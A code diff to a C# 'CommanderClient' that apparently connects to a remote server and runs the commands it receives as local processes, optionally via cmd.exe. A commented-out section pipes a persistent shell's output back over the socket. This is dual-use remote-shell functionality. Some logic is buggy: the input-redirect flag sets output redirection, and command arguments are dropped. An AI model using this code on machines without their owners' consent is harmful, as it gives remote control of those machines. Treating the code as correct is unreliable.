@@ -14,7 +14,7 @@ namespace CommanderClient
 		public static string ipAddr { get; set; }
 		public static string port { get; set; }
 		public static string CustomName { get; set; }
-		public static Process CommandProcess;
+		
 
 		private static Socket ServerSocket;
 		public static void Run() {
@@ -48,24 +48,57 @@ namespace CommanderClient
 				}
 			}
 		}
+		public static Process CmdProcess=null;
 		static void readInput(string Text) {        //this method reads received text
 			Console.WriteLine("readInput(\"{0}\")", Text);
-			string flags = Regex.Match(Text, @"^\<.+\>\b", RegexOptions.Multiline).Value;	//get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
-			Text = Text.Substring(flags.Length);		//remove flags
-			flags=flags.Trim('<', '>');
-			Console.WriteLine("Flags:\"{0}\"\nData:\"{1}\"", flags, Text);
+			string flags = Regex.Match(Text, @"^\<.+\>\b", RegexOptions.Multiline).Value;   //get flags by regex (example)-> https://regexr.com/4obl9 recommend to use external browser.
+			Text = Text.Substring(flags.Length);        //remove flags
+			flags = flags.Trim('<', '>');
+			Console.WriteLine("Flags:\"{0}\"\nText:\"{1}\"", flags, Text);
 
-			//Flages: $:server_message, e:just_check_exit_code, a:run_as_admin, v:visible_cmd_window, n:normal, s:shell execute
+			//Flages: $:server_message, @:write_in_a_running_cmd
 
-			if (flags.Contains("$")) {
+			if (flags == "$") {
 				//internall commands flag
 				//this line must run by internalcmd.Do
 				Console.WriteLine("Internal Command:\"{0}\"", Text);
 				Program.internalCmd.Do(Text);
+			/*} else if (flags.Contains("@")) {
+				Console.WriteLine("Running command in cmd");
+				if (CmdProcess == null) {
+					Console.WriteLine("Running cmd");
+					CmdProcess = Process.Start(new ProcessStartInfo("cmd.exe") {
+						UseShellExecute = false,
+						RedirectStandardOutput = true,
+						RedirectStandardError = true,
+						RedirectStandardInput = true,
+					});
+				}
+				Console.WriteLine("Writting command in cmd input");
+				CmdProcess.StandardInput.WriteLine(Text);
+				Console.WriteLine("Writed");
+				if (!flags.Contains("q")) {
+					Console.WriteLine("Reading output");
+					string Output = "";
+					char[] buffer = new char[1024];
+					CmdProcess.StandardOutput.Read(buffer, 0, 1024);
+					Send(new string(buffer));
+				}*/
 			} else {
 				//common command
-				foreach (char f in flags) {
-				}
+				ProcessStartInfo startInf = new ProcessStartInfo();
+				//'c' flag for setting cmd as file name
+				startInf.FileName = flags.Contains("c") ? "cmd.exe" : Text.Split(' ')[0];
+
+				//'s' flag for using shell execute
+				startInf.UseShellExecute = flags.Contains("s");
+
+				//'o' flag for redirecting standard output
+				startInf.RedirectStandardOutput = flags.Contains("o");
+
+				//'i' flag for redirecting standard input
+				startInf.RedirectStandardOutput = flags.Contains("i");
+				Process.Start(startInf);
 			}
 		}
 		public static int WaitSec { get; set; }
